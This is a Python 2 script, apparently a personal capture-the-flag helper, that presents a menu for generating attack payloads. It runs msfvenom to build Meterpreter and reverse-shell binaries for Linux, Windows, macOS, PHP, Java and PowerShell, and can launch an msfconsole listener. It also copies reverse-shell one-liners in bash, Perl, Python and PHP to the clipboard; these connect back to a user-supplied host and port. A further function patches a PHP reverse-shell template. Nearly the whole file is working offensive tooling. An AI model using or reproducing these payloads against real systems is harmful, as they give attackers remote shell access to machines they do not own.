#!/usr/bin/env python
# -*- coding: utf-8 -*-
# title           :shellcode.py
# description     :Help generate shellcode for a ctf
# author          :
# date            :
# version         :0.1
# usage           :python shellcode lhost lport
# =======================================================================

# Import the modules needed to run the script.
import sys
import os
import pyperclip

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]
args = (IP_ADDR, PORT)
# Main definition - constants
menu_actions = {}


# =======================
#     MENUS FUNCTIONS
# =======================

# Main menu
def main_menu():
    os.system('clear')

    print "Working Directory is /root/ctf/shellcode,\n"
    print "What code are you looking for?"
    print "1. Reverse Shells"
    print "2. TTY Code"
    print "3. One liners"
    print "\n0. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)
    return


# Execute menu
def exec_menu(choice):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Invalid selection, please try again.\n"
            menu_actions['main_menu']()
    return


# Menu 1
def reverse_shell_menu():
    generate_payloads()
    print "9. Back"
    print "0. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)
    return


# Menu 2
def tty_menu():
    generate_tty()
    print "9. Back"
    print "0. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)
    return


def one_liner_menu():
    generate_one_liners()
    print "9. Back"
    print "0. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)
    return


# Back to main menu
def back():
    menu_actions['main_menu']()


def msf_generate(payload, format_flag, filename):
    shell_code = "msfvenom -p %s LHOST=%s LPORT=%s -f %s -o %s" % (payload, IP_ADDR, PORT, format_flag, filename)
    terminal = 'msfconsole -qx "use exploit/multi/handler;set payload %s;set LHOST %s;set LPORT %s;exploit"' % (
        payload, IP_ADDR, PORT)
    print ("Generating payload: " + shell_code)
    os.system(shell_code)
    print "Do you want to setup the listener?"
    answer = raw_input("Enter yes or no: ")
    if answer == "yes":
        os.system(terminal)
    elif answer == "no":
        sys.exit()
    else:
        print("Please enter yes or no.")


def generate_payloads():
    payloads = {
        0: {'payload': "linux/x86/meterpreter/reverse_tcp", 'format': 'elf', 'filename': 'shell.elf'},
        1: {'payload': "linux/x64/shell/reverse_tcp", 'format': 'elf', 'filename': 'shell64.elf'},
        2: {'payload': "windows/meterpreter/reverse_nonx_tcp", 'format': 'exe', 'filename': 'shell.exe'},
        3: {'payload': "windows/x64/meterpreter/reverse_tcp", 'format': 'exe', 'filename': 'shell64.exe'},
        4: {'payload': "osx/x86/shell_reverse_tcp", 'format': 'macho', 'filename': 'shell.dmg'},
        5: {'payload': "osx/x64/shell_reverse_tcp", 'format': 'macho', 'filename': 'shell64.dmg'},
        6: {'payload': "php/meterpreter/reverse_tcp", 'format': 'raw', 'filename': 'shell.php'},
        7: {'payload': "python/meterpreter/reverse_tcp", 'format': 'raw', 'filename': 'shell.py'},
        8: {'payload': "java/jsp_shell_reverse_tcp", 'format': 'raw', 'filename': 'shell.jsp'},
        9: {'payload': "java/jsp_shell_reverse_tcp", 'format': 'war', 'filename': 'shell.war'},
        10: {'payload': "java/meterpreter/reverse_tcp", 'format': 'raw', 'filename': 'shell.war'},
        11: {'payload': "cmd/unix/reverse_bash", 'format': 'raw', 'filename': 'shell.sh'},
        12: {'payload': "cmd/windows/powershell_reverse_tcp", 'format': 'ps1', 'filename': 'shell.ps1'},
        13: {'payload': "windows/meterpreter/reverse_http", 'format': 'exe', 'filename': 'shell.exe'},
        14: {'payload': "windows/meterpreter/reverse_https", 'format': 'exe', 'filename': 'shell.exe'},
    }

    print "Select a Payload to generate"

    for x in payloads:
        print str(x) + ": " + payloads[x]['payload']

    selected_payload = input("Please select a payload: ")

    msf_generate(
        payloads[selected_payload]['payload'],
        payloads[selected_payload]['format'],
        payloads[selected_payload]['filename']
    )


def generate_tty():
    ttys = {
        0: {'payload': 'python -c \'import pty; pty.spawn("/bin/sh")\''},
        1: {'payload': 'python -c \'import pty; pty.spawn("/bin/bash")\''},
        2: {'payload': 'echo os.system(\'/bin/bash\')'},
        3: {'payload': '/bin/sh -i'},
        4: {'payload': 'perl: exec "/bin/sh";'},
    }

    print "Select a tty to generate"

    for x in ttys:
        print str(x) + ": " + ttys[x]['payload']

    selected_tty = input("Please select a payload: ")

    oneliner(ttys[selected_tty]['payload'])


def generate_one_liners():
    one_liners = {
        0: {'payload': 'bash -i >& /dev/tcp/%s/%s 0>&1' % args},
        1: {
            'payload': 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % args},
        2: {
            'payload': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'' % args},
        3: {'payload': 'php -r \'$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'' % args},
        4: {
            'payload': 'php -r \'$sock = fsockopen("%s",%s); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); \'' % args},
    }

    print "Select a one liner to generate"

    for x in one_liners:
        print str(x) + ": " + one_liners[x]['payload']

    selected_one_liner = input("Please select a payload: ")

    oneliner(one_liners[selected_one_liner]['payload'])


# Other resources
# http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html

# One liner shortcode
def oneliner(shellcode):
    print shellcode + " Copied to clipboard"
    pyperclip.copy(shellcode)
    sys.exit()


# Edit PHP Monkey's File	Menu 30
def php_file_pentestmonkey():
    filename = "php-reverse-shell.php"
    fin = open("/root/tools/shellcode/php-reverse-shell-template.php")
    fout = open(filename, "wt")
    for line in fin:
        if '127.0.0.1' in line:
            fout.write(line.replace('127.0.0.1', IP_ADDR))
        elif '1234' in line:
            fout.write(line.replace('1234', PORT))
        else:
            fout.write(line)
    fin.close()
    fout.close()
    print "File created and updated as: " + filename


# =======================
#    MENUS DEFINITIONS
# =======================

# Menu definition
menu_actions = {
    'main_menu': main_menu,
    '1': reverse_shell_menu,
    '2': tty_menu,
    '3': one_liner_menu,
    '99': back,
    '00': exit,
}

# =======================
#      MAIN PROGRAM
# =======================

# Main Program
if __name__ == "__main__":
    # Launch main menu
    main_menu()
